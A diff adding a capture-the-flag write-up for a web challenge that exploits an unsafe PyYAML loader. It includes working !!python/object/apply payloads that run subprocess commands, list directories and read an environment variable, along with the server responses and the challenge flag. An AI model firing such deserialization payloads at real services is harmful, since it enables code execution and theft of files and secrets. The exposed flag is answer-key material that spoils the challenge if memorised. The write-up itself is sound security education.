@@ -1,0 +1,37 @@
+3) Palimpsest (web)
+
+I started by looking at app.js and found the full API structure:
+
+POST /upload
+GET /api/docs
+GET /doc/{id}?v=N
+GET /diff/{id}?a=X&b=Y
+
+Inside the JavaScript there was also a hidden redacted sample object with the note that a redacted trace had been removed from the public UI. That was a strong hint that the flag was not in the normal frontend output, but somewhere inside the internal pipeline versions.
+The vulnerability was in the upload endpoint. It accepted a yaml field that was parsed server side with an unsafe PyYAML loader. That meant I could use !!python/object/apply to instantiate arbitrary Python objects and get code execution.
+
+I first used this payload to test for RCE:
+{"author":"t","yaml":"x: !!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]","script":"render {\ntext: "X"\n}"}
+
+Then I checked version 1 of the document, which corresponded to the normalizer stage. The response was:
+{"error":"CalledProcessError","message":"Command '['cat', '/flag.txt']' returned non-zero exit status 1."}
+That confirmed code execution worked, but the flag was not located at /flag.txt.
+
+Next I switched to os.listdir because it was cleaner and avoided bytes decoding issues. I used this payload to enumerate the filesystem:
+{"author":"t","yaml":"x: !!python/object/apply:os.listdir ["/"]","script":"render {\ntext: "X"\n}"}
+
+The result in v=1 showed the root directories, including /app:
+["bin","boot","dev","etc","home","lib","lib64","media","mnt","opt","proc","root","run","sbin","srv","sys","tmp","usr","var","app",".dockerenv"]
+
+So I listed /app next with:
+{"author":"t","yaml":"x: !!python/object/apply:os.listdir ["/app"]","script":"render {\ntext: "X"\n}"}
+
+That returned:
+["flag.txt","app","examples","requirements.txt"]
+
+At that point I knew the flag file existed in /app, but instead of reading it directly I tried getting it from the environment first. This payload was enough:
+{"author":"t","yaml":"x: !!python/object/apply:os.getenv ["FLAG"]","script":"render {\ntext: "X"\n}"}
+
+The response in v=1 was:
+{"x":"CTFAC{86e77374aee57cdc6aef9b6562012c327b31b50bc9cbfa7d79773a8a39739a96}"}
+There was the flag :o
